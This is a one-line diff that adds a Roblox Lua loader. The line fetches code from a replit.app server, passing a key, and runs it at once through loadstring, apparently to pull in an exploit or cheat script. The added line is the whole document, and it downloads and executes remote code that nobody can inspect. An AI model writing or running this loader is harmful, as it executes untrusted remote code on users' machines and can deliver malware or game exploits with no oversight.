@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://python-flask-server--yassin98087.replit.app/load?key=UCHIWA-Q8OF2HX6"))()
